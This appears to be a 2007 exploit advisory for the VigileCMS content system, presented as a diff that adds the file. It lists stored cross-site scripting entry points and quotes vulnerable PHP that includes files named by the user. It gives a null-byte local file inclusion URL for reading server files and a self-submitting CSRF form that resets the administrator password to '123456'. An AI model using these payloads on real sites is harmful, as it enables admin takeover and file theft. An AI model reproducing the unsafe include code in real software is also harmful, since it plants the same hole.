@@ -1,0 +1,55 @@
+---------------------------------------------------------------------------------------
+     .___          .__.__                                     
+   __| _/_______  _|__|  | _____   __ _________  ____   ____  
+  / __ |/ __ \  \/ /  |  | \__  \ |  |  \_  __ \/  _ \ /    \ 
+ / /_/ \  ___/\   /|  |  |__/ __ \|  |  /|  | \(  <_> )   |  \
+ \____ |\___  >\_/ |__|____(____  /____/ |__|   \____/|___|  /
+      \/    \/                  \/                         \/ 
+---------------------------------------------------------------------------------------
+   Status : Public
+   Author : DevilAuron
+   Board  : VigileCMS
+   Site   : http://devilsnight.altervista.org
+   Date   : [16-11-2007] (dd-mm-yyyy)
+---------------------------------------------------------------------------------------
+VigileCMS Multiple Vulnerabilities
+---------------------------------------------------------------------------------------
+Permanent Xss:
+---------------------------------------------------------------------------------------
+http://[site]/[path]/index.php?module=vedipm&inviapm=true
+http://[site]/[path]/index.php?module=live_chat
+Insert on the message the xss
+---------------------------------------------------------------------------------------
+Local File Inclusion:
+---------------------------------------------------------------------------------------
+index.php
+---------------------------------------------------------------------------------------
+	if (file_exists("$_GET[module].php")) {
+	include ($_GET['module'].".php"); 
+         } else {
+	include ("pagine/".$_GET['module'].".php"); 
+            }
+         navdx3("100%");
+
+         } else {
+	announcement ("<center><li><font color=\"red\">File non esistente</font></center>");
+            }
+---------------------------------------------------------------------------------------
+Then u can include all file present on the server
+http://[site]/[path]/index.php?module=[somefile]%00
+---------------------------------------------------------------------------------------
+CSRF:
+---------------------------------------------------------------------------------------
+Change Admin Password:
+---------------------------------------------------------------------------------------
+<form name="cambia" method="post" action="http://127.0.0.1/VIGILE_1.4/index.php?module=changepass">
+<input type="password" name="new1" maxlength=20 value="123456">
+<input type="password" name="new2" maxlength=20 value="123456">
+<input type="hidden" name="pw" value="Cambia la Password">
+</form>
+<script>document.cambia.submit()</script>
+---------------------------------------------------------------------------------------
+DevilAuron - http://devilsnight.altervista.org
+---------------------------------------------------------------------------------------
+
+# milw0rm.com [2007-11-18]
